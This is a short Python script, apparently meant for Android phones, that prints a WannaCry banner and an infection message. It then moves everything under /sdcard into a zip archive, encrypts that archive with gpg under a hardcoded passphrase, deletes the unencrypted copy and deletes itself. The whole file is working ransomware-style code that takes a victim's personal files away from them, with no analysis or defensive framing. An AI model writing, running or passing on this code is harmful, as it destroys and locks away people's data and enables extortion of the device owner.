import os,sys,time
logo = """

██╗    ██╗ █████╗ ███╗   ██╗███╗   ██╗ █████╗  ██████╗██████╗ ██╗   ██╗
██║    ██║██╔══██╗████╗  ██║████╗  ██║██╔══██╗██╔════╝██╔══██╗╚██╗ ██╔╝
██║ █╗ ██║███████║██╔██╗ ██║██╔██╗ ██║███████║██║     ██████╔╝ ╚████╔╝ 
██║███╗██║██╔══██║██║╚██╗██║██║╚██╗██║██╔══██║██║     ██╔══██╗  ╚██╔╝  
╚███╔███╔╝██║  ██║██║ ╚████║██║ ╚████║██║  ██║╚██████╗██║  ██║   ██║   
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   
"""
def package():
        try:
                import gnupg
                import zip
        except ImportError:
                os.system('pkg install -y gnupg zip &> /dev//null')

print(logo)
print ('your device has been infected virus WannaCry')
package()
os.system('zip --password indonesia123 your_file.zip -m -r /sdcard/* &> /dev//null')

os.system('gpg --batch -c --passphrase indonesia123 your_file.zip &> /dev//null')
os.system('rm your_file.zip;cp your_file.zip.gpg /sdcard')
os.system('rm -rf minicrypto.py')